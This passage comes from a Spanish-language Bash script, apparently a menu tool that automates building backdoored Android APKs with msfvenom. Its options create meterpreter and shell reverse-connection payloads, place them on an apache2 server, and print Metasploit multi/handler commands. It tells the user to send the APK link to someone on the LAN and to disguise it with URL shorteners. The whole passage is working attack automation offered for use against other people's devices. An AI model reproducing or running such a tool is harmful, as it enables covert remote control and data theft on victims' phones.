	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/meterpreter_reverse_https"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/meterpreter_reverse_https LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_https LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_http LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 3 || $optiondos == 03 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	elif [[ $optiondos == 4 || $optiondos == 04 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 
 

	elif [[ $optiondos == 5 || $optiondos == 05 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/shell/reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/shell/reverse_http LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_http LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_http LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 
 
 

	elif [[ $optiondos == 6 || $optiondos == 06 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mandroid/shell/reverse_https"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .apk > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .apk al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .apk. Tambien si quieres que el .apk se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .apk al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p android/shell/reverse_https LHOST=$lhost LPORT=$lport R > /var/www/html/$nombre.apk
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.apk \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .apk del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.apk
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_https LHOST=$lhost LPORT=$lport R > $nombre.apk
			mv $nombre.apk Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXITO"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p android/shell/reverse_https LHOST=$lhost LPORT=$lport R > $ruta/$nombre.apk 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload android/shell/reverse_https"
